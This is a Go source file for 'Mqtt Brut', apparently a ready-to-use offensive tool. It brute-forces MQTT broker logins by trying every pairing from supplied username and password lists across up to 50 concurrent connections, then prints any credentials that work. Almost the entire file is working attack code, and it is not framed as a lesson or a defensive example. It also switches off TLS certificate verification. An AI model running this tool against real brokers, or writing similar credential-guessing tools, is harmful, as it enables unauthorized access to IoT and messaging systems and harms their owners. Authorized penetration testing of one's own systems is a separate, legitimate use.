package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/eclipse/paho.mqtt.golang"
	"github.com/common-nighthawk/go-figure"
)

// Command line arguments
var (
	brokerHost   = flag.String("h", "", "MQTT broker host address")
	brokerPort   = flag.Int("p", 1883, "MQTT broker port (default: 1883)")
	caCert       = flag.String("c", "", "Path to CA certificate (if required)")
	tlsEnabled   = flag.Bool("t", false, "Enable TLS")
	usernameFile = flag.String("u", "", "Path to username file")
	passwordFile = flag.String("P", "", "Path to password file")
	numWorkers   = flag.Int("w", 50, "Number of concurrent workers (default: 50)")
)

// Display introductory graffiti
func displayIntro() {
	figure := figure.NewColorFigure("Mqtt Brut", "big", "green", true)
	figure.Print()
	fmt.Println("Version: v1.0.0")
	fmt.Println("Author: Bitthr3at")
	fmt.Println("")
}

// Load usernames or passwords from a file
func loadFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, strings.TrimSpace(scanner.Text()))
	}
	return lines, scanner.Err()
}

// Test a single username-password combination
func testCredentials(broker string, port int, username, password string, found *int32, attempt *int32, total int32, wg *sync.WaitGroup) {
	defer wg.Done()
	if atomic.LoadInt32(found) == 1 {
		return
	}

	// Print progress before attempting connection
	attemptNumber := atomic.AddInt32(attempt, 1)
	progress := float64(attemptNumber) / float64(total) * 100
	fmt.Printf("\r%s[INFO ] attempts=%d done=%d (%.2f%%) - Testing credentials -> username: %s, password: %s%s\033[K", "\033[33m", attemptNumber, attemptNumber, progress, username, password, "\033[0m")

	opts := mqtt.NewClientOptions()
	protocol := "tcp"
	if *tlsEnabled {
		protocol = "tls"
		if *caCert != "" {
			opts.SetTLSConfig(&tls.Config{
				InsecureSkipVerify: true, // Accept self-signed certificates
			})
		}
	}
	opts.AddBroker(fmt.Sprintf("%s://%s:%d", protocol, broker, port))
	opts.SetUsername(username)
	opts.SetPassword(password)
	opts.SetConnectTimeout(10 * time.Second) // Set a connection timeout to avoid hanging

	client := mqtt.NewClient(opts)
	token := client.Connect()
	if token.Wait() && token.Error() == nil {
		if atomic.LoadInt32(found) == 0 {
			fmt.Printf("\n%s[INFO ] Valid credentials found: username=%s, password=%s%s\n", "\033[32m", username, password, "\033[0m")
			fmt.Printf("%s[INFO ] Broker: %s:%d%s\n", "\033[32m", broker, port, "\033[0m")
			fmt.Printf("%s[INFO ] Connected at: %s%s\n", "\033[32m", time.Now().Format("2006-01-02 15:04:05"), "\033[0m")
			atomic.StoreInt32(found, 1)
		}
		client.Disconnect(250)
	}
}

// Main function to handle the testing logic
func main() {
	displayIntro()

	flag.Parse()
	if *usernameFile == "" || *passwordFile == "" {
		fmt.Println("Please provide both username and password files.")
		return
	}

	usernames, err := loadFromFile(*usernameFile)
	if err != nil {
		fmt.Printf("Error reading username file: %v\n", err)
		return
	}

	passwords, err := loadFromFile(*passwordFile)
	if err != nil {
		fmt.Printf("Error reading password file: %v\n", err)
		return
	}

	total := int32(len(usernames) * len(passwords))
	var found int32
	var attempt int32

	var wg sync.WaitGroup
	sem := make(chan struct{}, *numWorkers) // Semaphore to limit number of concurrent goroutines

	// Feed jobs to workers concurrently
	for _, username := range usernames {
		for _, password := range passwords {
			if atomic.LoadInt32(&found) == 1 {
				break
			}
			wg.Add(1)
			sem <- struct{}{} // Acquire a slot
			go func(username, password string) {
				defer func() { <-sem }() // Release the slot when done
				testCredentials(*brokerHost, *brokerPort, username, password, &found, &attempt, total, &wg)
			}(username, password)
		}
		if atomic.LoadInt32(&found) == 1 {
			break
		}
	}

	wg.Wait()
	fmt.Println() // Print a newline after progress output
}
